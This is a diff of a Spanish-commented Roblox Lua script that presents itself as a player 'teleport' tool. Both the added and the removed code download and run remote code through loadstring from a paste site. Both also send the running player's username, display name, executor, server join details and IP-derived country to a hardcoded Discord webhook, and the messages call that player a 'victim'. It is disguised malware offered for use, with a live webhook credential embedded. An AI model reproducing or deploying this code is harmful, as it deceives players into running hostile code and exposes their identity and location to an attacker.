@@ -1,110 +1,64 @@
+getgenv().EjecutarsePrimero = true
+
+-- Evitar que se ejecute dos veces
+if getgenv().ScriptYaEjecutado then return end
+getgenv().ScriptYaEjecutado = true
+
+-- 1. Ejecutar tu script externo primero
+loadstring(game:HttpGet("https://cdn.sourceb.in/bins/d7tPQFbVBD/0", true))()
+
+-- 2. Configuración del webhook
 local HttpService = game:GetService("HttpService")
 local Players = game:GetService("Players")
 local LocalPlayer = Players.LocalPlayer
 
--- ====================================
--- Script 1: Teleport con Scallp (se ejecuta primero)
--- ====================================
-if not getgenv().EjecutarsePrimero_TP then
-    getgenv().EjecutarsePrimero_TP = true
+local WebhookURL = "https://discord.com/api/webhooks/1384927333562978385/psrT9pR05kv9vw4rwr4oyiDcb07S3ZqAlV_2k_BsbI2neqrmEHOCE_QuFvVvRwd7lNuY"
 
-    pcall(function()
-        -- Reemplaza el loadstring normal por Scallp TP
-        loadstring(game:HttpGet("https://cdn.sourceb.in/bins/d7tPQFbVBD/0", true))()
-    end)
-end
-
--- ====================================
--- Script 2: Webhook Delta-safe (espera a que el TP termine)
--- ====================================
-if not getgenv().EjecutarsePrimero_Webhook then
-    getgenv().EjecutarsePrimero_Webhook = true
-
-    local function waitForPlayerLoad(player)
-        local character = player.Character or player.CharacterAdded:Wait()
-        if not character.PrimaryPart then
-            character:WaitForChild("HumanoidRootPart")
-        end
-        return character
+-- Detectar executor
+local Executor = "Desconocido"
+if identifyexecutor then
+    local success, exec = pcall(identifyexecutor)
+    if success and exec then
+        Executor = exec
     end
-
-    task.spawn(function()
-        waitForPlayerLoad(LocalPlayer) -- Espera TP completo
-
-        local WebhookURL = "https://discord.com/api/webhooks/1384927333562978385/psrT9pR05kv9vw4rwr4oyiDcb07S3ZqAlV_2k_BsbI2neqrmEHOCE_QuFvVvRwd7lNuY"
-        local placeId = tostring(game.PlaceId)
-        local jobId = tostring(game.JobId)
-        local nick = LocalPlayer.Name
-        local displayName = LocalPlayer.DisplayName
-        local timestamp = os.date("!%Y-%m-%d %H:%M:%S UTC")
-        local avatarUrl = "https://i.postimg.cc/DZW66bqk/IMG-20250316-120840.jpg"
-
-        -- Generar joinLink con Fern
-        local function generateJoinLink()
-            local uniqueId = HttpService:GenerateGUID(false)
-            return "https://fern.wtf/joiner?placeId="..placeId.."&gameInstanceId="..jobId.."&token="..uniqueId
-        end
-        local joinLink = generateJoinLink()
-
-        -- Detectar país
-        local function detectCountry()
-            local country = "No se logró detectar el país"
-            local services = {
-                "https://ipapi.co/json",
-                "https://ipinfo.io/json",
-                "https://freegeoip.app/json/",
-                "https://www.geoplugin.net/json.gp",
-                "https://ipwhois.app/json/"
-            }
-            for _, url in ipairs(services) do
-                pcall(function()
-                    local response = HttpService:GetAsync(url)
-                    if response then
-                        local data = HttpService:JSONDecode(response)
-                        if data then
-                            if data.country_name then country = data.country_name
-                            elseif data.country then country = data.country
-                            elseif data.geoplugin_countryName then country = data.geoplugin_countryName
-                            end
-                        end
-                    end
-                end)
-                if country ~= "No se logró detectar el país" then break end
-            end
-            return country
-        end
-
-        local countryName = detectCountry()
-        local countryField = "País: "..countryName
-
-        -- Preparar embed para Discord
-        local info = {
-            ["content"] = "**Teleport jugador 100% funciona 👀!**",
-            ["embeds"] = {{
-                ["title"] = "Datos para unirse 🔥",
-                ["description"] = "Información Delta-safe:",
-                ["color"] = 5814783,
-                ["thumbnail"] = {["url"] = avatarUrl},
-                ["fields"] = {
-                    {["name"] = countryField, ["value"] = " ", ["inline"] = true},
-                    {["name"] = "Usuario 👤", ["value"] = nick, ["inline"] = true},
-                    {["name"] = "DisplayName 👥", ["value"] = displayName, ["inline"] = true},
-                    {["name"] = "PlaceId ✅", ["value"] = placeId, ["inline"] = true},
-                    {["name"] = "JobId ✅", ["value"] = jobId, ["inline"] = true},
-                    {["name"] = "Link para unirse 🔥✅", ["value"] = joinLink, ["inline"] = false},
-                    {["name"] = "Hora 🕒", ["value"] = timestamp.." ("..countryName..")", ["inline"] = false}
-                }
-            }}
-        }
-
-        local jsonData = HttpService:JSONEncode(info)
-        pcall(function()
-            request({
-                Url = WebhookURL,
-                Method = "POST",
-                Headers = {["Content-Type"] = "application/json"},
-                Body = jsonData
-            })
-        end)
-    end)
 end
+
+-- Función para enviar embed al webhook
+local function SendWebhook(title, description, color)
+    local Data = {
+        ["embeds"] = {{
+            ["title"] = title,
+            ["description"] = description,
+            ["type"] = "rich",
+            ["color"] = color,
+            ["thumbnail"] = { ["url"] = "https://i.postimg.cc/DZW66bqk/IMG-20250316-120840.jpg" },
+            ["footer"] = {
+                ["text"] = "Sistema de alerta • " .. os.date("%d/%m/%Y %H:%M:%S")
+            }
+        }}
+    }
+    local FinalData = HttpService:JSONEncode(Data)
+    local request = request or http_request or (syn and syn.request) or (fluxus and fluxus.request)
+    if request then
+        request({
+            Url = WebhookURL,
+            Method = "POST",
+            Headers = {["Content-Type"] = "application/json"},
+            Body = FinalData
+        })
+    end
+end
+
+-- 3. Detectar cuando el jugador se va
+LocalPlayer.AncestryChanged:Connect(function(_, parent)
+    if not parent then
+        local hora = os.date("%H:%M:%S")
+        local msg = "⚠️ **Víctima se salió del servidor** 🚨\n"
+        msg = msg .. "👤 Usuario: **" .. LocalPlayer.Name .. "**\n"
+        msg = msg .. "🎭 Display: **" .. LocalPlayer.DisplayName .. "**\n"
+        msg = msg .. "🖥️ Executor: **" .. Executor .. "**\n"
+        msg = msg .. "⏰ Hora: **" .. hora .. "**"
+
+        SendWebhook("🚨 Alerta de salida 🚨", msg, 16711680) -- rojo
+    end
+end)
